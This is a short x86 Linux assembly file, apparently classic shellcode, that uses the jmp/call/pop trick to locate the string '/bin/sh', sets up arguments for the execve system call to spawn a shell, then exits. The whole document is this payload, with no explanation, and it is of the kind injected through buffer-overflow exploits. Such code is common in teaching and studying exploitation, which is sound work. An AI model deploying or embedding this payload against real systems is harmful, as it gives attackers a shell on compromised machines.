section .data
global _start
_start:
	jmp $+0x21
	pop esi
	mov DWORD [esi+0x8], esi
	xor eax, eax
	mov BYTE [esi+0x7], al
	mov DWORD [esi+0xc], eax
	mov al, 0xb
	mov ebx, esi
	lea ecx, [esi+0x8]
	lea edx, [esi+0xc]
	int 0x80
	xor ebx, ebx
	mov eax, ebx
	inc eax
	int 0x80
	call $-0x1f
	db "/bin/sh"
